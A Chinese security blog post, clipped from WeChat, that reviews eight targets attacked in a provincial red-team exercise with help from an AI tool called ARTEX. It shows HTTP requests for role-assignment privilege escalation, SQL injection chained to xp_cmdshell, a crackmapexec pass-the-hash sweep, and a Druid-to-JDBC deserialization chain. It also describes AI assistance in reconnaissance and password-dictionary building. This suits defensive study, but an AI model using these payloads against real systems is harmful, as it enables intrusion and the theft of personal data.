---
title: 【微信】看我如何用ARTEX拿下攻防第一
source: https://mp.weixin.qq.com/s/uY035nzMArL5PGwWZZU76Q
source_host: mp.weixin.qq.com
clip_date: 2026-11-19T11:56:38+08:00
trace_id: e44ac661-1f54-45fe-842a-f42ab27961f2
content_hash: 159c0c86fc334a4751d3fb411219741c722db5986c1adc37e5aebd6b9c489015
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 18
  succeeded: 18
  failed_urls: []
notion_page_id: 41d75244-d011-8100-bbef-c5d27c2564cc
ioc: null
---

**墨守安全** *2026年11月18日 09:00*

![封面](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/67663709dfed45d9.jpg)

前言：前不久参加了省上攻防演练，由于ARTEX加持，打下的目标数量是往年的三四倍，有几个有趣的目标印象比较深刻，这些目标类型丰富，既有门户、小程序，也有对象存储和监控台，重新捋一遍，作为案例总结，供学习复盘。

提示：为保护敏感信息，本文已作脱敏处理；文中配图由 AI 生成，仅作示意，请勿对号入座。内容侧重实战思路，仅供交流探讨。

表 1 · 目标清单

| 目标  | 初始突破点 | 核心风险 |
| --- | --- | --- |
| A   | 独立登录入口与弱口令 | 跨系统权限复用、个人信息泄露 |
| B   | 前端跳转与默认口令 | 数据库暴露 |
| C   | 角色赋值越权 | 管理员权限、连接串泄露 |
| D   | 备份包、未授权接口 | 主机失陷、内网横向、数据泄露 |
| E   | 客户端硬编码密钥 | 患者信息越权访问 |
| F   | JS 测试 URL 与弱口令 | 对象存储失陷 |
| G   | 初始化接口暴露凭证 | 批量存储凭证泄露 |
| H   | Druid 监控台弱口令 | 主机失陷、内网扩展 |

PART · 01

一、认证类漏洞

目标A：统一认证双因子绕过？

A.1

信息收集

目标 A 最后能打穿，多少有点出乎我的意料。

刚拿到它时，我甚至有些泄气。这类单位经过多年的攻防演练，能从互联网上直接撕开的口子已经不多了；即使偶尔找到入口，也大多只是边缘系统，很难拿到多少分。

信息收集做了几轮，最后只找到官网、一套统一认证，以及挂在统一认证后面的几个业务系统。搜索引擎还能翻出更多系统，但点进去无一例外都会跳到统一认证，登录时既要密码，也要手机验证码。我随手试了几次，访问很快就被限制，于是准备先放一放。

A.2

异常发现

第二天中午，我让 ARTEX帮忙过了一遍，发现一个此前没太注意的业务系统 JS有点不一样：页面会先加载完整资源，最后才跳转到统一认证。

A.3

弱口令突破

顺着 JS 里的调用逻辑，我们还原出了它自己的登录请求格式。我拿已有口令跑了一轮，居然撞中了一组弱口令。

当时只顾着继续往下走，后来复盘才想明白：双因子并没有被绕过，它确实在统一认证的入口；但问题在于，这个业务系统还保留着自己的登录页和密码校验，只是在前端做了跳转。

A.4

找到真实登录口

于是我在 Burp 里丢掉跳转包，再用浏览器开发者工具删掉盖在页面上的全屏动画。遮罩消失后，原来的登录页露了出来。输入账号和密码，主页慢慢加载完成，眼前竟然是目标 A 的数据中台。

数据中台本身已经足够重要，更麻烦的是，其中的管理员账号还能直接跳转到其他业务系统，相当于拿到了一个带管理员权限的统一认证身份。我逐个打开这些系统，发现其中几套可以直接导出个人信息，姓名、身份证号、手机号和住址都在，数据量极大，算了一下，光数据分就已经差不多了，于是整理证据、提交报告，这条线也就到此为止。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/95b123ef6300b5e9.jpg)

目标B：数据库泄露

B.1

同套路入口

有了目标 A 的经验，目标 B 就顺手多了。它用的是相似的业务系统，也会先跳转到统一认证。我照着之前的方法丢掉跳转包、删掉页面遮罩，原来的登录界面很快就露了出来。随后试了一组默认口令，成功进了后台。

B.2

数据库地址泄露

后台里没有太多可以直接利用的内容，不过从指纹可以确认它用的是 BladeX。继续查看数据源接口时，我发现了一套直接暴露在公网的数据库地址，便用 DBX 连了上去。库里没有找到适合继续利用的点，但数据量有几十万条，已经足够拿分数。提交结果后，我们结束了这条线。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/826a2f0909ed265f.jpg)

目标C：认证越权

目标 C 是后来回头补上的。

最初只拿到一个普通用户的弱口令，当时时间紧，简单翻了一遍，没看到特别有价值的内容，很快就把它放到了一边。重新检查时才发现，入口其实一直摆在眼前：普通用户虽然只能编辑用户信息，但服务端在处理角色赋值时没有做白名单校验。

POST /api/<module>/user/<action> HTTP/1.1

Cookie: <low-priv-session>

Content-Type: application/json

{"user":{"id":"<self>"},"assignedRoleNames":\["Admin","User"\]}

C.1

普通用户升级

POST /api/services/app/user/CreateOrUpdateUser HTTP/1.1

Host: supplier.example

Cookie:.AspNet.ApplicationCookie=<low-priv-session>

Content-Type: application/json

{"user":{"id":<self>,"name":"probe"},"assignedRoleNames":\["Admin","User"\]}

\----------

HTTP/1.1 200 OK

Content-Type: application/json

{"result":null,"success":true,"error":null}

重新登录后，权限项从 122 个增加到 234 个。看到这个数字时，我一度怀疑是不是哪里看错了。

管理员权限到手后，后面就简单多了。

C.2

漏洞利用

报表管理功能中有一个获取连接串的接口，只要传入空对象，就会返回一段 base64；解码后，里面是一条 sa 连接串。

POST /api/services/app/reportManager/GetConnectionString HTTP/1.1

Host: supplier.example

Cookie:.AspNet.ApplicationCookie=<admin-session>

Content-Type: application/json

{}

\-----------

HTTP/1.1 200 OK

Content-Type: application/json

{"result":"<base64>"}

Base64解码：

Server=db.internal;Database=<db_name>;User ID=sa;Password=<masked>

接着又在报表参数中发现注入点。组件虽然做了校验，但逻辑很简单：先按分号切分，再要求每一段都以 SELECT 开头。通过换行就能绕过这层限制，后面接上 EXEC xp_cmdshell，whoami 返回的是 nt authority\\network service。

报表参数注入执行命令

GET /Report/Viewer/Index?reportName=<report_name>&param1=x'%20;%20SELECT%201%0AEXEC%20xp_cmdshell%20'cmd%20/c%20whoami'-- HTTP/1.1

Host: supplier.example

Cookie:.AspNet.ApplicationCookie=<admin-session>

\----------

HTTP/1.1 200 OK

...

nt authority\\network service

这条链里没有什么新技术，无非是越权、连接串泄露和命令执行。

真正耽误时间的，是我第一次拿到普通账号时，太快认定它没有价值。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a7e30bb9f27d3940.jpg)

PART · 02

二、备份类漏洞

目标 D 是我们投入时间最多的一个，前后从两个入口摸了进去。

目标D入口一：通过被修复的旧漏洞找到备份

攻击链

备份包泄露 → 源码审计 → 未授权报表 SQL 注入（sa） → xp_cmdshell 命令执行 → Godzilla + EfsPotato→SYSTEM → PtH 横扫 192.168.26.0/24 → 获取数据库信息 + 备份 + 通话录音

这类目标通常不算难打：系统多、外包多，补丁估计也不完善，所以一开始我们都觉得，找到入口只是时间问题。真正上手后才发现并没有那么顺。资产测绘做完，只发现一台 IIS 站点；目录、端口和常见路径全扫了一遍，也没啥收获。

D.1

AI的信息收集

通过一些其他方法确定系统指纹后，我让 AI 帮忙梳理它过去公开或半公开的漏洞。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f4117cdc9c7f895e.jpg)

D.2

备份文件猜测

当我兴奋的使用这个poc进行验证的时候，发现行不通，该接口已被删除。着急之余我立刻转变思路，猜想系统缩写构造字典，然后对系统重新进行目前扫描，这次惊喜的发现成功获取到了系统的备份文件，可以全量下载：一个完整的站点备份包就放在 Web 根目录下，没有任何鉴权，体积一百三十多兆。我随即把整个压缩包下载了下来。（site为站点缩写）

GET /backup/<site>.zip HTTP/1.1

Host: portal.example

\----------

HTTP/1.1 200 OK

Content-Type: application/zip

Content-Length: <size>

D.3

获取源码

拿到源码，直接审计，压缩包里有几万个文件，原本还想着逐个查找，真正解开后才发现根本不用费这个劲：数据库连接串、后台超级管理员账号、写死的 DES 密钥，以及一整份内网资产清单，全都留在配置文件和代码注释里。接下来只需要耐心往下审。

D.4

漏洞利用

顺着报表模块看，很快就找到了直接拼接 SQL 的位置，参数没有经过有效过滤。我先用数据库版本做了验证，页面返回 500，报错里把版本号原样带了出来；再确认当前数据库账号，果然是 sa。

报表参数报错注入

GET /report/<endpoint>.aspx?code=report.rdlc&ActionId=1&OrgID=convert(int,@@version) HTTP/1.1

Host: portal.example

\----------

HTTP/1.1 500 Internal Server Error

...

将 nvarchar 值 'Microsoft SQL Server 20XX' 转换成数据类型 int 时失败。

报错回显确认当前账号为 sa；再用 is_srvrolemember('sysadmin') 确认 sysadmin 权限。

有了这个权限，后面的过程就简单多了：通过堆叠查询调用 xp_cmdshell，whoami 返回 nt authority\\system，说明数据库服务本身就以 SYSTEM 运行，连提权都省了。Web 端另外上传了一个内存马，主要是为了方便后续操作。

堆叠查询调用 xp_cmdshell

GET /report/<endpoint>.aspx?code=report.rdlc&ActionId=1&OrgID=0;DECLARE%20@t%20TABLE(o%20NVARCHAR(4000));INSERT%20@t%20EXEC%20master..xp_cmdshell%20'whoami';RAISERROR(@o,16,1)-- HTTP/1.1

Host: portal.example

\----------

HTTP/1.1 500 Internal Server Error

...

System.Data.SqlClient.SqlException: nt authority\\system

D.5

横向渗透

真正让人兴奋的是横向过程。以这台 SYSTEM 主机为跳板，我们搭好隧道，再用拿到的本地管理员哈希对一个内网 C 段做 Pass-the-Hash，最终发现 17 台主机的管理共享都可以读写。

以 SYSTEM 跳板经 suo5 隧道，用全域本地管理员 xxadmin 的 NTLM 哈希做 SMB Pass-the-Hash

抓取hash，约 17 台主机管理共享可读写。

xxadmin: xx密码 NTLM=exxxxxxxxx

crackmapexec smb 192.168.26.0/24 -u user -H exxxxxx

\=> \[+\] 17 hosts Pwn3d! (C$ / ADMIN$ readable)

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/73cb9c3d09b266b2.jpg)

后来才弄清楚，这批机器来自同一套镜像，本地管理员口令完全相同；运维后台又使用固定密钥加密口令，拿到数据后可以离线还原。一个入口就这样扩展到了整张内网。最后带出的内容包括业务库备份、全量通话录音、数百名员工的明文口令，以及后台超级管理员会话，收获比最初预想的多得多。

目标D入口二：另一个门户

同一家单位还有另一个门户，是后来顺手发现的。从指纹看，它使用 PublicCMS，运行在 Spring Boot 上。我先试了几个接口，版本号和服务器部署目录都直接返回，没有做任何隐藏；继续往下看，又发现接口清单同样不需要凭证。清单里有一个模板渲染接口，往模板参数中放入 FreeMarker 表达式后，WAF 会拦截 ${，但旧式插值可以绕过，随后便读到了类路径下的文件。

不过，真正拿到分数的不是文件读取，而是两个未授权的列表接口。我分页拉取了反馈列表和在线咨询列表。前者有三百多条记录，手机号、邮箱、姓名和反馈正文都是明文，去重后仍有两百多个手机号和两百多个邮箱；后者有二十多条，年龄、性别、病情描述和受理单号都在，手机号只做了部分脱敏。

我们还尝试比较两个登录接口的验证码校验，并枚举出几个账号测试弱口令，但返回结果都是“用户已被禁用”，最终没有拿到后台会话或 webshell。这条线只拿到了数据分，谈不上完整接管，不过目标暴露的数据范围已经很清楚了。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dbbcf93dab95e0cb.jpg)

PART · 03

三、客户端和存储桶类

目标E：JWT

目标 E 的入口是一款微信小程序。问题并不在服务端，而在客户端：小程序安装包把加密和鉴权所需的关键材料一起交了出来。反编译之后，请求逻辑几乎一眼就能看明白。请求体使用 SM4 加密，签名由 MD5 和时间戳组成，Authorization 则是一个 HS256 的 JWT。可 SM4 密钥、JWT secret 和签名算法全都硬编码在客户端，服务端没有参与密钥分发。

示意:

SM4 key=<hardcoded-key>

JWT secret=<hardcoded-secret>

sign=MD5(canonical+timestamp)

POST /<mini>/api/<biz>/<query> HTTP/1.1

Authorization: Bearer <self-signed JWT>

我按照客户端的逻辑自行构造请求，发到患者查询接口。第一次返回“系统中未找到对应信息”，换一个参数后又返回“患者信息传入有误”。这两条提示本身说明不了太多，但至少证明请求已经进入业务逻辑。随后换成一个真实存在的身份证号，接口返回了姓名、身份证号、手机号、地址、余额和完整住院信息。也就是说，只要知道某个身份证号，就能查询对应患者的就诊信息。问题不在加密或签名，而在服务端只检查 token 是否有效，却没有核对 token 属于谁、它又有权查询谁。

这个案例并不复杂，却很有代表性。很多单位把 WAF、堡垒机和防护策略都堆在 Web 入口，小程序后端得到的关注却少得多。在攻防演练中，与其一直硬啃防护严密的门户，这类客户端暴露出来的薄弱环节往往更值得检查。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/78be0bdaee55f91d.jpg)

目标F：JS

目标 F 最初已经被我们放弃。常规资产收集只找到一个业务系统和一个官网，互联网资产与目标 A 很像，看不出明显入口。后来 AI 在业务系统的 JS 中翻到一条测试 URL。我先用浏览器访问，页面打不开，刚提起来的兴趣又落了下去。没过多久，进一步的 FUZZ 结果表明，这其实是一个 MinIO 存储桶。AI 还结合 URL 和 JS 中的信息整理出一套社会工程学字典。我用这套字典测试数据包，撞中了一组账号口令：账号是单位缩写，口令则是“缩写@年份”。随后通过 API 接管了存储桶。里面文件不少，裁判确认其中包含较重要的内容，我们便整理证据并提交报告。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4c4f8cf7169815b2.jpg)

目标G：接口

目标 G 与 F 有些相似，不过这个 MinIO 是我们做资产测绘时直接发现的。测试 /minio/bootstrap/v1/verify 接口后，发现这个原本只应在初始化阶段使用的接口没有鉴权，访问后会直接返回配置，其中包含 57 组账号口令，以及 58 组 Access Key 和 Secret Key。我们取其中一组进行验证，可以列出存储桶，也能读取多个桶中的文件。一个本应短暂存在的初始化接口，最后成了批量泄露凭证的出口。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/50b273bac5671cc4.jpg)

PART · 04

四、404

Druid这个案例是我个人最喜欢的一段，因为整条攻击链的转折点，只是一个 404。

H.1

奇怪的404

测试时发现目标 H 把的 Druid 监控台存在。这类后台如果存在未授权访问或弱口令，通常可以直接看到数据库地址、账号、连接池状态和 SQL 监控。不过这个站有些特别：直接访问时什么都看不到，页面只显示一句“您访问的页面无法找到”。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bb87782e34a79ec9.jpg)

H.2

找到后台

不少人看到 404 就会离开，但我觉得 Druid 的路径既然已经存在，更可能只是访问方式不对。于是我在 Burp 中把 GET 改成 POST，直接向登录接口发送了一组常见弱口令。接口随即返回 success。

GET /druid/datasource.json HTTP/1.1

Host: ops.example

{"Result":\[{"Name":"master","URL":"jdbc:mysql://<db-host>:3306/app?<params>","UserName":"<masked>","Password":"<masked>"}\]}

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d2453da19b01d1e9.jpg)

按理说这个案例要论入口的话也应该归类为认证类，但由于这个案例的特殊性，还是单独拿出来写一下。

H.3

getshell

进入后台后，我先查看数据源，数据库地址、账号和口令都直接显示在页面上。

读取数据源信息：

GET /druid/datasource.json HTTP/1.1

Host: ops.example

\----------

HTTP/1.1 200 OK

Content-Type: application/json

{"Result":\[{"Name":"master","URL":"jdbc:mysql://db.internal:3306/app?<redacted>","UserName":"<masked>","Password":"<masked>"}\]}

数据源 JSON 直接给出 JDBC URL、账号与口令。

jdbc:mysql://db.internal:3306/app?autoDeserialize=<redacted>&queryInterceptors=<redacted>

更有价值的是连接参数：反序列化和查询拦截相关的开关都处于开启状态。

SQL 监控页还能提供后续利用所需的表结构与高频查询：

GET /druid/sql.json HTTP/1.1

Host: ops.example

\----------

HTTP/1.1 200 OK

Content-Type: application/json

{"Result":\[{"SQL":"select...","ExecuteCount":<n>,"ErrorCount":<n>}\]}

当然，仅仅看到参数还不够，还要确认连接串能否修改，以及驱动版本是否存在可利用的点。实际测试后，这两个条件都满足，最终通过 JDBC 反序列化拿到了服务器权限，过程比预想中顺利。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fd00bcd433175836.jpg)

H.4

内网横向

拿到 shell 只是开始。我随即搭建代理进入内网，第一轮扫描发现了三台 Elasticsearch、五台 Web 服务器和四台数据库服务器。数据库可以直接通过 DBeaver 连接，里面的数据量都不小。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bfd870818e363ab2.jpg)

更大的突破发生在后面。我们从 172 网段继续摸到 10 网段，相当于从一套逻辑隔离的内网跳到了另一套，期间接管了两套钉钉，又利用一个内网 RCE 带出一万多条数据。随后通过命令执行上线 vshell，确认落点已经位于 10 网段。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bf3de91362bdbfe1.jpg)

接下来，新的入口一个接一个出现。内网中的一个 actuator 端点暴露了大量凭证；顺着这些凭证继续排查，又找到一个 Flink 上传 RCE，再拿下一台主机。最后通过 Nacos 的历史漏洞进入配置中心，大部分配置都可以直接查看。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5398a7aa2ac6a988.jpg)

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c29e558269aa83c0.jpg)

这条线最后还延伸到一个 20 网段，涉及的内容比较敏感，这里不再展开。整个案例真正的转折点，就是最开始那个 404。如果当时完全相信页面给出的结果，后面的内网也就不会出现了。

![案例过程截图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d2c4e33f8d6e65d6.jpg)

PART · 05

五、总结

回头看这八个案例，会发现它们都不是一击即中，大多数时候，看似毫无希望，正常尝试后也没啥收获，最后却在一些不经意的地方，或是平时非常容易忽略的小问题上找到切入点，再顺着这个入口慢慢往下走。

没有一个靠的是新技术：前端跳转架空了双因子，角色赋值不做校验，备份包就躺在 Web 根目录，密钥硬编码在小程序里，初始化接口忘了下线。攻防打到最后，拼的不是谁的技术更先进，而是谁的疏忽更少；决定安全水位的，也从来不是最强的那道防线，而是最容易被忽略的那块短板。

说到底，信息收集，信息收集，还是他妈的信息收集。
